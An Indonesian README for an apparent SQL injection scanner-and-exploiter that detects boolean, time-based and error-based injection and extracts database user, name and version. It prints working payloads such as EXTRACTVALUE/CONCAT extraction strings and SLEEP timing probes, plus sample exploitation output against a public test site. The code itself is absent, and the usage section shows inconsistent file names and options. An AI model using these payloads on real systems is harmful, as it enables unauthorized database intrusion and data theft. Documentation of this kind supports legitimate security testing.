# SQLiPoCEngine: Mesin Pemindai & Eksploitasi SQLi Cerdas

```markdown
   ▄▄▄       ██▓███  ▓█████  ██▀███   ▒█████   ██▓    
  ▒████▄    ▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓██▒    
  ▒██  ▀█▄  ▓██░ ██▓▒▒███   ▓██ ░▄█ ▒▒██░  ██▒▒██░    
  ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░▒██░    
   ▓█   ▓██▒▒██▒ ░  ░░▒████▒░██▓ ▒██▒░ ████▓▒░░██████▒
   ▒▒   ▓▒█░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░
    ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░
    ░   ▒   ░░          ░     ░░   ░ ░ ░ ░ ▒    ░ ░  ░ 
        ░  ░            ░  ░   ░         ░ ░      ░  ░
```

`SQLiPoCEngine` adalah *tool* pemindai keamanan *multi-thread* canggih yang dirancang untuk menemukan, mengidentifikasi, dan secara otomatis mengeksploitasi kerentanan SQL Injection (SQLi) yang kompleks.

Tidak seperti *scanner* biasa yang hanya mencari error, *tool* ini berspesialisasi dalam menemukan kerentanan *Blind* (Boolean-based & Time-based) yang paling sulit ditemukan di berbagai vektor serangan, lalu secara otomatis membuktikan dampaknya (PoC) dengan mengekstraksi data.

## ⚠️ Peringatan Penting

**Tool ini dibuat murni untuk tujuan edukasi dan pengujian keamanan yang sah (authorized).**

  * **Jangan Pernah** gunakan *tool* ini pada sistem yang bukan milik Anda atau tanpa izin tertulis yang eksplisit.
  * *Bug bounty* adalah pengujian yang sah, tetapi pastikan Anda selalu mematuhi *scope* (ruang lingkup) program.
  * Penulis tidak bertanggung jawab atas penyalahgunaan *tool* ini atau kerusakan apa pun yang disebabkannya.

-----

## 🚀 Fitur Unggulan

  * **Pemindaian Multi-Vektor:** Tidak hanya URL, *tool* ini menguji:
      * Parameter GET
      * Parameter POST (Form-Data)
      * *Body* JSON (untuk API)
      * *HTTP Headers* (Cookie, User-Agent, Referer, dll.)
  * **Deteksi Multi-Konteks:** Secara otomatis menguji payload untuk konteks **String** (`'payload'`) dan **Numerik** (`123 payload`) untuk akurasi maksimum.
  * **Deteksi Cerdas (Fingerprinting):** Saat kerentanan *time-based* terdeteksi, *tool* ini akan **mengidentifikasi jenis database** (MySQL, MSSQL, PostgreSQL) dan secara cerdas **hanya** menggunakan payload yang relevan setelahnya.
  * **Eksploitasi Otomatis (PoC):** Setelah kerentanan terkonfirmasi, *tool* ini akan **otomatis** mencoba melakukan eksploitasi *Error-Based* untuk mengambil data sensitif seperti `user()`, `database()`, dan `version()`.
  * **Akurasi Sangat Tinggi:** Menggunakan **analisis diferensial (baseline)** untuk membandingkan respons *true*, *false*, dan *normal*. Ini hampir sepenuhnya menghilangkan *false positive*.
  * **Sangat Cepat (Multi-Thread):** Memindai semua parameter, header, dan *key* JSON *di dalam* satu target secara paralel.
  * **Aman:** Menggunakan verifikasi SSL secara *default*.

-----

## ⚙️ Kebutuhan Sistem

  * Python 3.x
  * Library `requests`

Anda dapat menginstalnya menggunakan pip:

```bash
pip install requests
```

-----

## 📖 Cara Penggunaan

Versi *tool* ini dirancang untuk pemindaian target tunggal secara interaktif.

### Langkah 1: Salin Kode

Salin kode v6 (Edisi Interaktif) ke dalam file, misalnya `sqli_engine.py`.

### Langkah 2: Jalankan Pemindai

Jalankan *script* dari terminal Anda:

```bash
# Basic scan dengan stealth maksimal
python ultimate_sqli.py -u "http://target.com/page.php?id=1"

# Deep scan dengan AI maksimal
python ultimate_sqli.py -u "http://target.com/login.php" -p "user=admin&pass=test" --deep --risk 3

# Debug mode untuk development
python ultimate_sqli.py -u "http://target.com/test.php?id=1" --debug --no-stealth

# Targeted technique testing
python ultimate_sqli.py -u "http://target.com/page.php?id=1" --technique time --proxy http://127.0.0.1:8080
```

### Langkah 3: Masukkan Target Anda

*Tool* ini akan langsung meminta Anda untuk memasukkan URL target:

```bash
--- SELAMAT DATANG DI MESIN PEMINDAI SQLi v6 ---
PERINGATAN: Gunakan hanya pada target yang diizinkan.

Masukkan URL target (cth: http://test.com/index.php?id=1): 
```

Cukup masukkan URL lengkap (termasuk parameter) dan tekan Enter.

```bash
Masukkan URL target (cth: http://test.com/index.php?id=1): http://testphp.vulnweb.com/artists.php?artist=1

--- MEMULAI PEMINDAIAN PADA: http://testphp.vulnweb.com/artists.php?artist=1 ---
[*] Memindai http://testphp.vulnweb.com/artists.php?artist=1...
... (hasil pemindaian akan muncul di sini) ...
```

**Catatan Penting:** Mode interaktif ini dirancang untuk **target GET sederhana**. Untuk memindai target POST atau JSON, Anda masih harus memodifikasi blok `if __name__ == "__main__":` secara manual untuk memanggil `scan_target()` dengan konfigurasi *dictionary* (kamus).

-----

## 📊 Contoh Hasil

Berikut adalah contoh output saat *tool* ini menemukan dan mengeksploitasi kerentanan:

```bash
[*] Memindai http://testphp.vulnweb.com/artists.php?artist=1...
[INFO] Database terdeteksi pada http://testphp.vulnweb.com/artists.php?artist=1: mysql
[VULNERABLE] Boolean-Based (String) terdeteksi pada URL Param (GET): artist
[VULNERABLE] Time-Based (String) terdeteksi pada URL Param (GET): artist
[EXPLOITED] Data ditemukan pada URL Param (GET) - artist: root@localhost
[EXPLOITED] Data ditemukan pada URL Param (GET) - artist: acuart
[EXPLOITED] Data ditemukan pada URL Param (GET) - artist: 5.5.21
...
(Laporan akan dicetak di bawah...)

============================================================
LAPORAN HASIL SCAN v6 - http://testphp.vulnweb.com/artists.php?artist=1
============================================================

--- [!] KERENTANAN DITEMUKAN ---

--- Vektor: URL Param (GET) - artist ---
  > Tipe    : Boolean-Based (String)
  > Payload : ' AND '1'='1'--
  > Tipe    : Time-Based (String)
  > Payload : ' AND SLEEP(3)--

--- [!!!] DATA BERHASIL DIEKSPLOITASI ---

--- Vektor: URL Param (GET) - artist ---
  > DATA    : root@localhost
  > Payload : ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT USER())))--
  > DATA    : acuart
  > Payload : ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))--
  > DATA    : 5.5.21
  > Payload : ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION())))--

============================================================
--- PEMINDAIAN SELESAI ---
```

-----

## 💡 Bagaimana Cara Kerjanya

1.  **Baseline:** *Tool* mengirim permintaan normal untuk mengukur panjang konten dan waktu respons.
2.  **Boolean-Based:** *Tool* mengirim payload `... AND 1=1` (true) dan `... AND 1=2` (false). Jika respons *true* cocok dengan *baseline* dan respons *false* **berbeda**, kerentanan ditemukan.
3.  **Time-Based:** *Tool* mengirim payload `... AND SLEEP(3)`. Jika waktu respons secara signifikan lebih lama dari `baseline + 3 detik`, kerentanan ditemukan.
4.  **Fingerprint:** Saat *time-based* berhasil, *tool* mencatat DBMS (`mysql`, `mssql`, `postgresql`) berdasarkan payload yang berhasil.
5.  **Exploit (PoC):** *Tool* menggunakan payload *error-based* (`EXTRACTVALUE`, dll.) yang sesuai dengan DBMS yang terdeteksi untuk mengambil data dan membuktikan dampaknya.

## ⛔ Batasan

  * **Fokus Target Tunggal:** Versi *script* ini dirancang untuk satu input interaktif. Untuk pemindaian *multi-target* (memindai daftar URL), gunakan versi *script* sebelumnya yang berbasis daftar `TARGETS_TO_SCAN`.
  * **Bukan Crawler:** *Tool* ini adalah **pemindai presisi**, bukan *crawler*. Ini adalah pilihan desain. Alur kerja terbaik adalah menggunakan *tool* lain (seperti `gospider` atau `hakrawler`) untuk menemukan 1000 URL, lalu memasukkan URL tersebut ke *tool* ini (atau versi berbasis daftar).
  * **Eksploitasi Terbatas:** *Tool* ini hanya melakukan eksploitasi *Error-Based* untuk PoC cepat. Ia **tidak** melakukan eksploitasi *Blind-Based* (mengambil data huruf demi huruf), yang merupakan proses sangat lambat yang lebih baik ditangani oleh *tool* seperti `sqlmap`.
